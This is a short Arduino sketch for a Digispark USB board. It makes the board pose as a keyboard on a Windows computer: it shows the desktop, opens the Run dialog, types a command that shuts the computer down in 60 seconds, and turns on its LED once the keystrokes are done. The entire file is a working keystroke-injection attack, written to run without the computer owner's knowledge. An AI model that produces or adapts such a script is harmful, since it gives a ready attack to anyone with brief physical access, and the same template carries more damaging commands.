#include "DigiKeyboard.h"
/* Init function */
//script created by valkyrix.github.io
void setup()
{ //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.println("shutdown -s -t 60");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
